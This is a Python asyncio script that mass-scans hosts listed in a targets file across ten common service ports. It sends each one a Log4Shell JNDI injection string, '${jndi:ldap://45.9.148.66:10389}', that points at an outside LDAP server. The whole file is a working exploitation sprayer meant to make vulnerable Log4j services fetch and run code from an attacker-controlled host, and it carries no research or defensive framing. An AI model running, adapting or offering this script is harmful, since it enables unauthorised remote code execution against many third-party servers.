import asyncio
import traceback

async def write_to(writer, message):
     return writer.write(message.encode())

async def read_from(reader):
     return reader.read(100)

async def client(ip, port, loop, message):

     try:
          fut = asyncio.open_connection(ip, port)
          #reader, writer = yield from asyncio.wait_for(fut, timeout=3)
          reader, writer = await asyncio.wait_for(fut, timeout=3)

          print(f"writing data {message}")
          fut = loop.create_task(write_to(writer, message))
          writey = await asyncio.wait_for(fut, timeout=3)

          fut_data = loop.create_task(read_from(reader))
          data = await asyncio.wait_for(fut_data, timeout=3)
          print(data)
     except Exception as e:
          print(e)
#          traceback.print_exc()
          return
          
     print(f'Close the socket for host {port}') 
     writer.close() 

message = 'iiii  ${jndi:ldap://45.9.148.66:10389} iiiii'
loop = asyncio.get_event_loop()

with open("targets.txt") as targets:
     c = 1
     ports = [20,21,22,23,24,25,10,8080,8000,8888]
     for target in targets:
          target = target.strip()
          for port in ports:
               host = target.strip()
               print(f"resuming/starting task for target {host}")
               loop.create_task(client(host, port, loop, message))
               if c % 100 == 0:
                    print("letting tasks finished")
                    #try:
                    pending = asyncio.all_tasks(loop)
                    loop.run_until_complete(asyncio.gather(*pending))
#                    except:
#                         print("Failed, trying again next round")
          c += 1
loop.run_forever()
loop.close()
